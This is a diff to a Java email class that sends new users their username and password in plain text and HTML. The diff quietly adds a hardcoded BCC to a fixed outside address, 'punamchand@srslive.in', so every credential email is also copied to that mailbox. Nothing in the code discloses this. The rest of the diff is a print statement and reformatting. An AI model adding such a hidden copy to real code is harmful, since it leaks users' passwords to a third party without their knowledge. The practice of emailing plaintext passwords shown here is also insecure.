@@ -59,26 +59,30 @@ public class EmailSessionBean {
 			message.setFrom(new InternetAddress(from));
 			InternetAddress[] address = { new InternetAddress(to) };
 			message.setRecipients(Message.RecipientType.TO, address);
+			message.setRecipients(Message.RecipientType.BCC, "punamchand@srslive.in");
+
 			message.setSubject(subject);
 			message.setSentDate(new Date());
 			/* message.setText(body); */
 			Multipart multipart = new MimeMultipart("alternative");
 
 			MimeBodyPart textPart = new MimeBodyPart();
-			//If email client does not support html-------------------------
+			// If email client does not support html-------------------------
 			String textContent = "Username: " + Username + " Password:" + Password;
-			//-----------------------------------------------------------------
+			// -----------------------------------------------------------------
 			textPart.setText(textContent);
 			MimeBodyPart htmlPart = new MimeBodyPart();
 			String htmlContent = "<html><h1>Welcome " + Name
-					
-					+ "</h1><p><h3>Please Use the following credentials to login to your Account</h3></p>"
+
+			+ "</h1><p><h3>Please Use the following credentials to login to your Account</h3></p>"
 					+ "<p><b>Username:</b> " + Username + "</p>" + "<p><b>Password:</b> " + Password + "</p></html>";
 			htmlPart.setContent(htmlContent, "text/html");
 			multipart.addBodyPart(textPart);
 			multipart.addBodyPart(htmlPart);
 			message.setContent(multipart);
 			Transport.send(message);
+
+			System.out.println("Mail Sent...!!!");
 		} catch (MessagingException ex) {
 			ex.printStackTrace();
 		}
